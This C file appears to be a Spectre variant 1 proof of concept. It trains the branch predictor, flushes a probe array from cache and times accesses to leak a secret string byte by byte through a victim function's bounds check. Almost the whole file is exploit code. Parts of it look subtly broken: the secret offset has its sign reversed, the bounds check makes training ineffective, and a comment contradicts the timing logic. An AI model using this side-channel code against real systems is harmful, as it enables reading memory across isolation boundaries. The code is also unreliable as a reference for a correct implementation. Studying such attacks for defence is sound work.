#include <emmintrin.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>

#include "../cache.h"

char array1[16] CACHE_LINE_ALIGNED = {1};
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;
char *secret CACHE_LINE_ALIGNED_PTR = "The answer is 42";

void noinline victim_function(size_t x) {
  if (x < strlen(array1)) {
    probe[array1[x] * CACHE_LINE_SIZE] = 1;
  }
}

size_t spectre_v1_attack(size_t x) {
  ptrdiff_t secret_offset = array1 - secret;
  static size_t results[256] = {0};

  for (size_t try = 0; try < 100; try++) {
    memset(results, 0, sizeof(results));

    // Train the CPU predictor to always predict _taken_
    for (size_t i = 0; i < 30; i++) {
      victim_function(x);
    }

    // Flush the probe array from the cache
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    // Execute the attack
    victim_function(secret_offset + x);

    // Measure the access time
    for (size_t i = 0; i < 256; i++) {
      size_t time = measure_access_time(&probe[i * CACHE_LINE_SIZE]);
      if (time <= CACHE_HIT_THRESHOLD) {
        results[i] = time;
      }
    }

    // Find the index with the highest access time
    size_t index = valid_read(results, 256);
    if (index != -1) {
      return index;
    }
  }

  return 0;
}

int main() {
  char snooped[256] = {0};
  for (size_t i = 0; i < 256; i++) {
    size_t index = spectre_v1_attack(i);
    if (index != 0) {
      snooped[i] = index;
    }
  }

  for (size_t i = 0; i < 256; i++) {
    if (snooped[i] != 0) {
      printf("Byte %lu: %d\n", i, snooped[i]);
    }
  }

  printf("Snooped: %s\n", snooped);

  return 0;
}
